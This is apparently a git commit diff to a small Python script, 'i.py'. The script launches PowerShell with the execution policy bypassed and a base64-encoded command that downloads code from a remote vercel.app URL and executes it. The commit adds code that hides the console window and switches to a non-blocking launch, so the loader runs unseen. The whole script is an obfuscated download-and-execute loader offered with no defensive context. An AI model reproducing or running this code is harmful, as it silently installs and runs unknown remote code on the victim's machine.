777dceb0c9f1b161751f32b62f454234b36ce26a
43a1723 <hai1723notgay@gmail.com>
2025-03-14 20:23:11 +0700

    Update i.py

--- a/i.py
+++ a/i.py
@@ -1,4 +1,5 @@
 import subprocess
-
+import ctypes
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 cmd = 'cmd.exe /k powershell -ExecutionPolicy Bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA'
-subprocess.run(cmd, shell=True)
+subprocess.Popen(cmd, shell=True)
